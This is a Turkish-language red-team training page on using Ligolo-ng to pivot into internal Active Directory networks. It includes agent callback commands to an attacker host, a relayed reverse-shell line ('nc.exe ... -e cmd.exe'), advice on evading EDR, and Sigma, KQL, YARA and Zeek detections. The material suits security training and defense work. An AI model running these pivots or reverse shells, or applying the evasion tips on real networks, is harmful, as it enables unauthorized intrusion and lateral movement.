# Ligolo-ng

> **Kategori:** [16. TÜNELLEME, PİVOT VE SOCKS PROXY (PIVOTING & TUNNELING)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Sanal TUN ağ arabirimi kullanarak saldırgan makinesinde doğrudan Katman 3 (IP seviyesinde) yönlendirme sağlayan, Proxychains kısıtlamalarını ortadan kaldırarak yerel araçların iç Active Directory ağlarına şeffaf erişimini mümkün kılan yeni nesil pivot aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory sızma testlerinde iç ağlara pivot yaparken geleneksel yöntem SOCKS proxy (SSH dynamic port forwarding veya Chisel) ve `proxychains` kullanmaktır. Ancak Proxychains mimarisi, `LD_PRELOAD` kütüphane kancalaması (hooking) ile yalnızca dinamik olarak bağlanan C kütüphanelerinin `connect()` sistem çağrılarını yakalayabilir. Bu durum kırmızı takım operasyonlarında ciddi engeller yaratır:
* Go, Rust gibi statik derlenen veya doğrudan syscall kullanan modern araçlar Proxychains ile çalışmaz.
* ICMP (Ping), ARP ve ham soket kullanan araçlar (örn. `nmap -sS` SYN taraması) SOCKS üzerinden iletilemez.
* UDP tabanlı kritik protokoller (DNS, SNMP, Kerberos UDP) Proxychains tarafından çoğunlukla desteklenmez.
* Her bir komutun önüne `proxychains` yazma zorunluluğu operasyonel hızı düşürür ve karmaşık scriptlerin çalışmasını bozar.

Nicolas Chatelain (@nico-cha20) tarafından Go ile geliştirilen **Ligolo-ng**, bu sorunları Katman 3 (Ağ Katmanı) seviyesinde çalışan sanal bir **TUN (Network TUNnel)** arabirimi ile çözer. Ligolo-ng iki ana bileşenden oluşur:
1. **Proxy (Saldırgan Sunucusu):** Saldırganın Linux makinesinde çalışır; işletim sisteminde `ligolo` adında bir TUN arabirimi oluşturur ve kurban ajanlardan gelen TLS şifreli tünelleri yönetir.
2. **Agent (Kurban Makine):** Ele geçirilen pivot sunucusunda (Windows veya Linux) çalışan, C2 veya proxy sunucusuna ters bağlantı kuran son derece hafif bağımsız bir istemcidir.

Ajan sunucuya bağlandığında, saldırgan kendi Linux makinesinin çekirdek yönlendirme tablosuna iç alt ağı ekler (`ip route add 10.10.10.0/24 dev ligolo`). Bu andan itibaren saldırgan makinesindeki **tüm araçlar** (Nmap, CrackMapExec, Impacket, Responder, tarayıcılar vb.), sanki kurban makinenin bağlı olduğu iç ağ anahtarına (switch) fiziksel bir Ethernet kablosu takılmış gibi, hiçbir proxy yapılandırmasına ihtiyaç duymadan doğrudan iç IP adreslerine (`10.10.10.10`) paket gönderip alabilir.

```
+---------------------------------------------------------------------------------------------------+
|                                 LIGOLO-NG MİMARİ VE ÇALIŞMA ŞEMASI                                |
+---------------------------------------------------------------------------------------------------+

 [ Saldırgan Makinesi (Kali / Ubuntu) ]
   - TUN Arabirimi: "ligolo" (IP: 10.10.10.0/24 için Route Var)
   - Ligolo Proxy Dinleyicisi (0.0.0.0:11601)
   - Araçlar: nmap -sS, netexec, evil-winrm, impacket (Proxychains YOK!)
             │
             ▲
   Kurumsal Güvenlik Duvarı (TLS Port 11601 İzni)
             ▲
             │ 1. Ters TLS Tüneli (Agent -> Proxy)
             │    (Tüm L3 IP Paketleri Kapsüllenir)
             │
 [ Ele Geçirilen Pivot Noktası (DMZ Host) ]
   - Ligolo Agent (ligolo-agent.exe)
   - İç Ağ IP: 10.10.10.5
             │
             ├─► 2. Saldırgandan gelen IP paketlerini doğrudan iç ağa yansıtır
             │
             ▼
 [ İç Kurumsal Active Directory Segmenti ] (10.10.10.0/24)
   - 10.10.10.10: DC01 (Kerberos / LDAP / SMB)
   - 10.10.10.20: Dosya Sunucusu (SMB)
   - 10.10.10.30: SQL Server (MSSQL 1433)
             │
             └─► 3. Geri dönen yanıtlar TUN arabirimi üzerinden saldırganın aracına akar
```

### Neden Önemli?

| Özellik | Operasyonel Avantajı |
|:---|:---|
| **Sıfır Proxychains Bağımlılığı** | Araçların önüne proxychains ekleme ihtiyacını tamamen ortadan kaldırır; şeffaf IP yönlendirme sağlar. |
| **Tam Nmap ve ICMP Desteği** | SYN taramaları (`-sS`), işletim sistemi tespiti (`-O`) ve ping taramaları kusursuz çalışır. |
| **UDP Protokol Desteği** | Kerberos UDP (Port 88), DNS (Port 53) ve SNMP (Port 161) trafiği sorunsuz iletilir. |
| **Çok Yüksek Performans (Go + TUN)** | C kütüphane kancalaması yerine Linux çekirdeğinin doğrudan ağ yığını (network stack) kullanılır; yüksek bant genişliği sunar. |
| **Ters Dinleyici Yönlendirme (Listener)** | İç ağın derinliklerinden pivot ajanına doğru atılan ters kabukları (reverse shell) doğrudan saldırgana ulaştırır. |
| **Çift Pivot (Multi-Hop / Double Pivot)** | İç ağda ele geçirilen ikinci bir makine üzerinden daha derin izole segmentlere kademeli pivot imkanı verir. |

### Pivot Yöntemleri Karşılaştırma Matrisi

| Kriter | Ligolo-ng | Chisel + Proxychains | SSH Dynamic (-D) | VPN (OpenVPN) |
|:---|:---|:---|:---|:---|
| **Ağ Katmanı** | Katman 3 (IP/TUN) | Katman 5 (SOCKS5 TCP) | Katman 5 (SOCKS4/5) | Katman 2/3 (TAP/TUN) |
| **Proxychains Gereksinimi**| ❌ Asla Gerekmez | ✅ Zorunlu | ✅ Zorunlu | ❌ Gerekmez |
| **Nmap SYN Scan (-sS)** | ✅ Desteklenir | ❌ Desteklenmez (-sT şart) | ❌ Desteklenmez | ✅ Desteklenir |
| **Statik Binary / Go Araçları** | ✅ Sorunsuz | ❌ Sıklıkla Bozulur | ❌ Sıklıkla Bozulur | ✅ Sorunsuz |
| **Kurulum / Yetki İhtiyacı** | Saldırganda Root (TUN) | Normal Kullanıcı | Normal Kullanıcı | Sunucu/Ajan Root |
| **Ajan Bellek İzi** | Çok Düşük (Tek PE) | Orta (Go Binary) | SSH Sunucusu/İstemci| Yüksek (VPN Ajanı) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Ligolo-ng iki ayrı ikili dosya olarak derlenir: `proxy` ve `agent`.

### 2.1 Proxy (Saldırgan Tarafı) Sözdizimi

```bash
./proxy [SEÇENEKLER]
```

| Parametre | Açıklama | Tür | Örnek Değer |
|:---|:---|:---|:---|
| `-laddr <ip:port>` | Ajanların bağlanacağı dinleme adresi ve portu (Varsayılan: `0.0.0.0:11601`). | Ağ | `-laddr 0.0.0.0:443` |
| `-certfile <dosya>` | TLS şifrelemesi için kullanılacak genel sertifika dosyası. | Kripto | `-certfile server.crt` |
| `-keyfile <dosya>` | TLS özel anahtar dosyası. | Kripto | `-keyfile server.key` |
| `-selfcert` | Otomatik olarak kendinden imzalı (self-signed) geçici TLS sertifikası üretir. | Kolaylık | `-selfcert` |

### 2.2 Agent (Kurban Tarafı) Sözdizimi

```cmd
agent.exe [SEÇENEKLER]
```

| Parametre | Açıklama | Tür | Örnek Değer |
|:---|:---|:---|:---|
| `-connect <ip:port>` | Bağlanılacak Ligolo proxy sunucusunun adresi ve portu. | Bağlantı | `-connect 198.51.100.10:443` |
| `-ignore-cert` | Sunucu sertifikasının güvenilir bir CA tarafından imzalanmış olmasını denetlemez (Self-cert için şart). | OPSEC | `-ignore-cert` |
| `-retry` | Bağlantı koptuğunda ajanın sonsuz döngüde yeniden bağlanmayı denemesini sağlar. | Dayanıklılık | `-retry` |
| `-retry-interval <sure>`| Yeniden bağlanma denemeleri arasındaki bekleme süresi (Varsayılan: 5s). | Zamanlama | `-retry-interval 10s` |

### 2.3 İnteraktif Proxy Konsolu Komutları

Ajan bağlandığında saldırganın proxy terminalinde açılan interaktif oturum komutları:

| Komut | Açıklama | Örnek |
|:---|:---|:---|
| `session` | Bağlı aktif ajan oturumlarını listeler ve yönetilecek oturumu seçer. | `session` |
| `start` | Seçili ajan için TUN tünel yönlendirmesini başlatır. | `start` |
| `stop` | Aktif tünel yönlendirmesini durdurur. | `stop` |
| `ifconfig` | Seçili ajanın yerel ağ arabirimlerini ve IP adreslerini listeler. | `ifconfig` |
| `listener_add` | Kurban makinede ters bağlantıları yakalamak için yerel dinleyici açar. | `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444` |
| `listener_list` | Ajan üzerinde aktif çalışan dinleyicileri listeler. | `listener_list` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Sanal TUN Arabiriminin Hazırlanması ve Proxy Başlatma
Ligolo-ng kullanılmadan önce saldırgan makinesinde sanal ağ arabirimi yapılandırılmalı ve proxy ayağa kaldırılmalıdır.

```bash
# 1. TUN arabirimi oluşturulur ve ayağa kaldırılır
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 2. Ligolo Proxy kendinden imzalı sertifika ile başlatılır
./proxy -selfcert -laddr 0.0.0.0:11601
```

```text
INFO[0000] Loading certificates...
INFO[0000] Generated self-signed certificates
INFO[0000] Listening on 0.0.0.0:11601
ligolo-ng »
```

### Senaryo 2: Kurban Windows Makinede Ajanı Çalıştırma ve Tüneli Başlatma
Ele geçirilen DMZ sunucusunda (Windows) ajan çalıştırılır ve proxy'ye ters bağlantı kurulur.

```cmd
C:\Windows\Temp\agent.exe -connect 198.51.100.10:11601 -ignore-cert -retry
```

Saldırgan terminalindeki bildirim:
```text
INFO[0025] Agent joined: CORP\svc_web @ 10.10.10.5 (Windows 10.0.17763)
ligolo-ng » session
? Specify a session : 1 - CORP\svc_web @ 10.10.10.5 (Windows)
[Agent : CORP\svc_web] » start
INFO[0032] Starting tunnel to CORP\svc_web
[Agent : CORP\svc_web] »
```

### Senaryo 3: Linux Çekirdek Yönlendirme Tablosuna İç Ağı Ekleme
Tünel başladıktan sonra, iç ağa giden paketlerin sanal `ligolo` arabirimine yönlendirilmesi sağlanır.

```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

Doğrulama (Doğrudan Ping ile ICMP Denetimi):
```bash
ping -c 3 10.10.10.10
```

```text
PING 10.10.10.10 (10.10.10.10) 56(84) bytes of data.
64 bytes from 10.10.10.10: icmp_seq=1 ttl=127 time=38.4 ms
64 bytes from 10.10.10.10: icmp_seq=2 ttl=127 time=37.9 ms
64 bytes from 10.10.10.10: icmp_seq=3 ttl=127 time=38.1 ms
```

### Senaryo 4: İç Ağdaki Domain Controller'a Doğrudan Nmap SYN Taraması Yapma
Proxychains'in asla yapamadığı ham soket SYN taraması (`-sS`) doğrudan çalıştırılır.

```bash
nmap -sS -Pn -p 88,135,389,445,3268 10.10.10.10
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-14 21:43
Nmap scan report for 10.10.10.10
Host is up (0.038s latency).

PORT     STATE SERVICE
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
3268/tcp open  globalcatLDAP

Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds
```

### Senaryo 5: İç Ağdaki Hedeflerden Ters Kabuk Yakalama (Listener Redirect)
İç ağdaki izole bir makineden (`10.10.10.100`) atılacak bir reverse shell, pivot ajanına (`10.10.10.5`) yönlendirilir; Ligolo ajanı bu trafiği şeffaf şekilde saldırganın `nc` dinleyicisine aktarır.

**Ligolo Konsolunda:**
```text
[Agent : CORP\svc_web] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
INFO[0120] Listener created on 0.0.0.0:4444 (TCP)
```

**Saldırgan Makinesinde:**
```bash
nc -nvlp 4444
```

İç ağdaki kurban makinede ters bağlantı tetiklendiğinde (`nc.exe 10.10.10.5 4444 -e cmd.exe`), saldırganın ekranında doğrudan oturum açılır:
```text
Connection received on 127.0.0.1 52144
Microsoft Windows [Version 10.0.17763.1577]
C:\Windows\system32> whoami
corp\sql_service
```

### Senaryo 6: Çift Pivot (Double Pivot / Multi-Hop) Kurulumu
Birinci pivot makinesinin (`10.10.10.5`) arkasında keşfedilen ve yalnızca ikinci bir ağa (`172.16.50.0/24`) erişimi olan bir başka sunucuya ulaşıldığında:
1. İkinci sunucuda `agent.exe -connect 10.10.10.5:11601` çalıştırılır.
2. Birinci sunucuda `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601` ile port proxy'ye aktarılır.
3. Proxy konsolunda 2. ajan oturumu seçilir (`session 2`) ve `start` denir.
4. Saldırgan `sudo ip route add 172.16.50.0/24 dev ligolo` ekleyerek en derin segmente şeffaf erişim sağlar.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|:---|:---|:---|
| `FATA[0000] Failed to open tun interface: no such file or directory` | Linux çekirdeğinde TUN modülü yüklenmemiş veya kullanıcıda TUN oluşturma yetkisi yoktur. | `sudo modprobe tun` komutunu çalıştırın ve TUN arabirimini `sudo ip tuntap add user ... mode tun ligolo` ile elle oluşturun. |
| `INFO[0010] Agent joined...` ancak paketler iç ağa ulaşmıyor | Çekirdek yönlendirme tablosuna ilgili rota eklenmemiş veya Ligolo konsolunda `start` komutu verilmemiştir. | Proxy oturumunda `start` yazdığınızdan emin olun; `ip route show` ile `10.10.10.0/24 dev ligolo` rotasını teyit edin. |
| `FATA[0005] x509: certificate signed by unknown authority` | Sunucu self-signed sertifika kullanmaktadır ve ajan sertifikayı reddetmiştir. | Ajan komutuna `-ignore-cert` bayrağını ekleyin (`agent.exe -connect ... -ignore-cert`). |
| Paketler gidiyor ancak yanıtlar (SYN-ACK) dönmüyor | Hedef iç ağ cihazlarının varsayılan ağ geçidi (Default Gateway) saldırganın kaynak IP'sini tanımamaktadır. | Pivot makinesinde giden paketler için iptables/NAT uygulayın veya Ligolo'nun dahili loopback mekanizmalarını kontrol edin. |
| `FATA[0000] listen tcp 0.0.0.0:11601: bind: address already in use` | Belirtilen port başka bir süreç veya arka planda asılı kalmış eski bir Ligolo süreci tarafından dinlenmektedir. | `sudo lsof -i :11601` ile süreci bulun ve `kill -9` ile sonlandırın ya da `-laddr 0.0.0.0:11602` gibi farklı port kullanın. |
| Ters dinleyici (listener_add) bağlantıyı iletmiyor | Kurban makinenin yerel Windows Güvenlik Duvarı (Windows Defender Firewall) gelen porta izin vermemektedir. | Ajan makinesinde geçici firewall kuralı ekleyin (`netsh advfirewall firewall add rule name="Ligolo" dir=in action=allow protocol=TCP localport=4444`) veya yüksek portlar seçin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
+---------------------------------------------------------------------------------------------------+
|                                LIGOLO-NG TESPİT VE GÖZLEMLENEBİLİRLİK                             |
+---------------------------------------------------------------------------------------------------+

 [ Ağ İletişimi (Pivot Ajanı -> Proxy) ]
  - Dış IP'ye Sürekli TLS Bağlantısı           ====> Sysmon Event ID 3 (Network Connection)
  - Kendinden İmzalı (Self-Signed) TLS Sertifikası => Ağ Sensörü (Suricata/Zeek Anomali İmzası)
  - Standart Dışı Port (11601/TCP)

 [ Host / Süreç Seviyesi İzler ]
  - Go Çalışma Zamanı (Go Runtime / Goroutines) ====> Bellek İçi Statik İmza ve EDR Analizi
  - Named Pipe / TUN Sürücüsü Etkileşimleri

 [ İç Ağ Trafik Anomalileri ]
  - Tek Bir DMZ Sunucusundan Tüm AD Ağına      ====> NDR / SIEM Davranışsal Analizi
    Anormal SYN Taraması ve RPC/SMB/LDAP
```

### 5.1 Bırakılan İzler ve Windows Olay Günlükleri
* **Sysmon Event ID 3 (Network Connection):** `agent.exe` sürecinin dışarıdaki bir IP adresine (örneğin port 11601 veya 443) sürekli açık kalan TLS bağlantısı başlatması.
* **Sysmon Event ID 1 (Process Creation):** Ajanın kurban makinede komut satırı argümanları (`-connect`, `-ignore-cert`) ile başlatılması.
* **Windows Security Event ID 5156 (Firewall Connection Allowed):** Dinleyici (`listener_add`) açıldığında yerel portun gelen bağlantılara açılması.

### 5.2 Ağ ve EDR İmzaları
* **TLS Parmak İzi (JA3/JA4):** Go standart kütüphanesinin TLS el sıkışma parmak izi, standart kurumsal tarayıcılardan farklıdır ve TLS parmak izi denetleyicileri tarafından işaretlenebilir.
* **Trafik Asimetrisi:** DMZ'deki tek bir web veya servis sunucusunun iç ağdaki onlarca sunucuya çok kısa sürede farklı portlardan (Kerberos, LDAP, SMB, RDP) paket göndermesi EDR/NDR korelasyon alarmlarını tetikler.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Kullanım Amacı |
|:---|:---|:---|:---|
| **Command and Control** | `T1090.002` | Proxy: External Proxy | Dış proxy sunucusu üzerinden iç ağ trafiğini şeffaf şekilde yönlendirme. |
| **Command and Control** | `T1572` | Protocol Tunneling | IP seviyesindeki ağ trafiğini TLS oturumu içerisine kapsülleyerek iletme. |
| **Discovery** | `T1046` | Network Service Discovery | TUN tüneli üzerinden iç ağ servislerini Nmap ile haritalandırma. |
| **Lateral Movement** | `T1021.002` | Remote Services: SMB/Windows Admin Shares | Tünel üzerinden iç etki alanı sunucularına psexec/smbexec yürütme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Risk Seviyesi | Operasyonel Önlem / Kaçınma Yöntemi |
|:---|:---|:---|
| Standart Port (11601) Kullanımı | **YÜKSEK** | Proxy dinleyicisini mutlaka kurumsal ağlarda izin verilen 443 (HTTPS) portuna alın. |
| Self-Signed TLS Sertifikası | **YÜKSEK** | Kendinden imzalı sertifika yerine Let's Encrypt veya meşru bir alan adına ait geçerli CA sertifikası kullanın (`-certfile`). |
| Açık Komut Satırı Parametreleri | **ORTA** | `-connect` ve `-ignore-cert` bayraklarını kodun içine gömerek ajanı parametresiz çalışacak şekilde yeniden derleyin. |
| Derlenmiş Go İkili İmzası | **KRİTİK** | Açık kaynaklı `agent.exe` dosyasını `garble` ile sembolleri gizleyerek derleyin veya in-memory loader ile yürütün. |

### 5.5 Tespit Kuralı Örnekleri (Sigma & KQL)

#### Sigma Kuralı (Ligolo-ng Ajan Çalıştırma Tespiti):
```yaml
title: Ligolo-ng Tunneling Agent Execution
id: 9a2f1b40-3d71-4a88-bf12-9c3140a87ef2
status: production
description: Detects the execution of Ligolo-ng tunneling agent via command line arguments.
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'agent.exe'
      - '-connect '
      - '-ignore-cert'
  condition: selection
falsepositives:
  - Legitimate custom administrative software with similar flags (very unlikely)
level: critical
```

#### Microsoft Sentinel KQL Sorgusu:
```kusto
DeviceProcessEvents
| where ProcessCommandLine has_any ("-connect", "-ignore-cert") and ProcessCommandLine has_any ("agent.exe", "ligolo")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
```

#### Zeek / Bro Şüpheli TLS Sertifikası İncelemesi:
```text
# Ligolo-ng self-signed sertifikalarının issuer/subject alanlarında "Ligolo" veya boş DN tespiti
event ssl_established(c: connection) {
    if ( c$ssl?$subject && c$ssl$subject == "CN=ligolo-ng" ) {
        NOTICE([$note=Notice::Action, $msg=fmt("Ligolo-ng default TLS certificate detected from %s", c$id$orig_h)]);
    }
}
```

#### Incident Response (IR) PowerShell Tünel Tespiti:
```powershell
# Sürekli dışarıya bağlı kalan ve yüksek veri alışverişi yapan süreçleri sorgulama
Get-NetTCPConnection -State Established | Where-Object {
    $_.RemotePort -in @(443, 11601, 8443) -and $_.RemoteAddress -notmatch "10\..*|192\.168\..*"
} | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess, @{N='Process';E={(Get-Process -Id $_.OwningProcess).ProcessName}}
```

#### YARA Kuralı (Ligolo-ng İkili Tespiti):
```yara
rule HackTool_Go_Ligolo_NG_Strings {
    meta:
        description = "Detects Ligolo-ng proxy and agent executables"
        author = "RedTeam SecOps"
        date = "2026-10-14"
        reference = "https://github.com/nico-cha20/ligolo-ng"
    strings:
        $s1 = "github.com/nico-cha20/ligolo-ng" ascii
        $s2 = "Agent joined:" ascii wide
        $s3 = "Starting tunnel to" ascii wide
        $s4 = "listener_add" ascii wide
        $s5 = "-ignore-cert" ascii wide
    condition:
        uint16(0) == 0x5A4D or uint32(0) == 0x464C457F and 3 of ($s*)
}
```

### 5.6 Savunma Karşılığı ve Sertleştirme
* **Ağ Segmentasyonu ve DMZ İzolasyonu:** DMZ'de bulunan sunucuların iç etki alanı ağlarına (Domain Controllers vb.) doğrudan herhangi bir port üzerinden erişimi kısıtlanmalı, yalnızca zorunlu tekil portlara (örn. LDAP 389) erişim verilmelidir.
* **Giden Port Kısıtlamaları:** Sunucu segmentlerinin internete doğru 11601 veya standart dışı portlardan doğrudan TCP bağlantısı açması güvenlik duvarında engellenmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Saldırgan Sisteminde TUN Arabirimi Oluşturma
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
```
* **Ne Yapar?:** Linux çekirdeğinde root olmayan kullanıcının yönetebileceği sanal bir ağ arabirimi (`ligolo`) açar.
* **Ne Zaman Kullanılır?:** Ligolo proxy başlatılmadan önce bir kerelik çalıştırılır.
* **Parametreler:** `mode tun ligolo` (TUN modunda arabirim adı).

#### 2. Saldırgan Sisteminde Ligolo Proxy'yi Başlatma
```bash
./proxy -selfcert -laddr 0.0.0.0:443
```
* **Ne Yapar?:** Port 443 üzerinde self-signed SSL sertifikasıyla ajan bağlantılarını bekleyen dinleyiciyi başlatır.
* **Ne Zaman Kullanılır?:** Operasyon boyunca ters bağlantıları kabul etmek için.
* **Parametreler:** `-selfcert` (otomatik sertifika), `-laddr` (dinleme portu).

#### 3. Kurban Windows Makinede Ajanı Ters Bağlantı ile Tetikleme
```cmd
agent.exe -connect 198.51.100.10:443 -ignore-cert -retry
```
* **Ne Yapar?:** Hedef sunucudan saldırgan proxy'sine şifreli TLS tüneli kurar ve koparsa tekrar dener.
* **Ne Zaman Kullanılır?:** Pivot noktası ele geçirildiğinde tüneli ayağa kaldırmak için.
* **Parametreler:** `-connect <ip:port>`, `-ignore-cert`, `-retry`.

#### 4. Kurban Linux Makinede Ajanı Arka Planda Başlatma
```bash
nohup ./agent -connect 198.51.100.10:443 -ignore-cert -retry >/dev/null 2>&1 &
```
* **Ne Yapar?:** Linux tabanlı kurban sunucuda ajanı bağımsız bir daemon olarak arka planda çalıştırır.
* **Ne Zaman Kullanılır?:** SSH oturumu sonlandığında tünelin kopmasını önlemek için.
* **Parametreler:** `nohup ... &`.

#### 5. Proxy Konsolunda Tüneli Başlatma
```text
session -> 1 -> start
```
* **Ne Yapar?:** Seçili kurban ajanı ile TUN arabirimi arasındaki IP paket yönlendirmesini aktif eder.
* **Ne Zaman Kullanılır?:** Ajan bağlandıktan hemen sonra tünel trafiğini başlatmak için.
* **Parametreler:** `start`.

#### 6. Linux Çekirdek Rota Tablosuna Hedef Alt Ağı Ekleme
```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```
* **Ne Yapar?:** `10.10.10.0/24` ağına gidecek tüm paketlerin sanal `ligolo` arabirimine yönlendirilmesini sağlar.
* **Ne Zaman Kullanılır?:** Tünel başlatıldıktan sonra saldırgan makinesinde çalıştırılır.
* **Parametreler:** `<hedef_subnet> dev ligolo`.

#### 7. Kurban Ajanında Ters Dinleyici (Port Forward) Açma
```text
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```
* **Ne Yapar?:** Kurban makinenin 4444 portuna gelen bağlantıları saldırganın yerel 4444 portuna aktarır.
* **Ne Zaman Kullanılır?:** İç ağın derinliklerindeki izole makinelerden reverse shell almak için.
* **Parametreler:** `--addr <kurban_dinleme>`, `--to <saldırgan_hedef>`.

#### 8. Ajan Üzerinde Aktif Dinleyicileri Listeleme
```text
listener_list
```
* **Ne Yapar?:** Kurban makinede tanımlanmış tüm port yönlendiricilerini görüntüler.
* **Ne Zaman Kullanılır?:** Hangi portların aktif yönlendirildiğini denetlemek için.
* **Parametreler:** `listener_list`.

#### 9. Kurban Makinenin Ağ Arabirimlerini İnceleme
```text
ifconfig
```
* **Ne Yapar?:** Seçili ajanın sahip olduğu tüm IP adreslerini ve alt ağ maskelerini listeler.
* **Ne Zaman Kullanılır?:** Hedef makinenin bağlı olduğu yeni iç alt ağları keşfetmek için.
* **Parametreler:** `ifconfig`.

#### 10. Tüneli Durdurma ve Temizleme
```text
stop
```
```bash
sudo ip route del 10.10.10.0/24 dev ligolo
```
* **Ne Yapar?:** Aktif tüneli kapatır ve saldırgan makinesindeki statik rotayı temizler.
* **Ne Zaman Kullanılır?:** Pivot operasyonu tamamlandığında ağ tablosunu eski haline getirmek için.
* **Parametreler:** `stop` ve `ip route del`.

---

## Kaynaklar

* [Nicolas Chatelain Resmi GitHub Deposu: Ligolo-ng](https://github.com/nico-cha20/ligolo-ng)
* [Ligolo-ng Resmi Dokümantasyonu](https://ligolo-ng.github.io/)
* [The Hacker Recipes: Pivoting with Ligolo-ng](https://www.thehacker.recipes/a-d/movement/pivoting/ligolo-ng)
* [HackTricks: Tunneling and Port Forwarding (Ligolo-ng)](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html#ligolo-ng)
* [MITRE ATT&CK: Protocol Tunneling (T1572)](https://attack.mitre.org/techniques/T1572/)

---

> **Önceki:** [← Chisel](./Chisel.md) · **Sonraki:** [Proxychains-ng →](./Proxychains-ng.md)
